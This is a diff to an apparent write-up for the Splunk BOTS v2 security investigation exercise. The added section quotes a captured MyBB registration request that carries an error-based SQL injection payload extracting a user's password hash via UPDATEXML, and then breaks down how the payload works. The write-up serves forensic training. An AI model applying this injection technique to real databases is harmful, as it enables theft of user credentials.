@@ -369,9 +369,9 @@ index="botsv2" source="stream:http" "www.brewertalk.com"
 Using the attacker IP from Question 3:
 ```
 index="botsv2" src_ip="ATTACKER_IP"
-Show more lines
+```
 
-Tip: Set Sampling to 1:100 to avoid query cancellation.
+Tip: Set Sampling to 1:100 to avoid query cancellation. (Not required here)
 
 This returns over 140,000 events. Use Interesting Fields to identify the targeted URI path. 
 
@@ -430,6 +430,83 @@ Review the results to determine the SQL function being abused.
    uri_path: /member.php
 } 
 ```
+taking a closer look at the data field contains:
+```
+regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1
+```
+That payload is an error-based SQL injection attack.
+
+The key indicator is:
+```
+updatexml(
+NULL,
+concat(0x3a,
+(SUBSTRING(
+(SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1),
+32,31
+))
+),
+NULL
+)
+```
+Why it's error-based SQLi
+
+UPDATEXML() is a MySQL XML function. When given malformed XML/XPath arguments, it intentionally generates a database error. Attackers abuse this because the error message can contain the result of a query.
+
+Example:
+
+```
+UPDATEXML(NULL, CONCAT(':', database()), NULL)
+```
+
+Might produce an error similar to:
+
+```
+XPATH syntax error: ':mydatabase'
+``
+The attacker then reads the data from the error message.
+
+### What this payload is doing
+
+The injected sql string:
+
+```
+' and updatexml(...)
+and '1
+```
+
+Attempts to append a condition to the original query.
+
+Inside the UPDATEXML() call:
+
+```
+SELECT password
+FROM mybb_users
+ORDER BY UID
+LIMIT 5,1
+```
+
+retrieves the password hash from the 6th user record (offset 5).
+
+Then:
+
+```
+SUBSTRING(..., 32, 31)
+```
+
+extracts part of that hash.
+
+Then:
+
+```
+CONCAT(0x3a, ...)
+```
+
+Adds a colon (:) before the extracted data.
+
+Finally, UPDATEXML() causes an error containing that value, allowing the attacker to exfiltrate the password hash through the application's error output.
+
+
 
 Questions 6 & 7: XSS Cookie and Spear-Phishing User
 
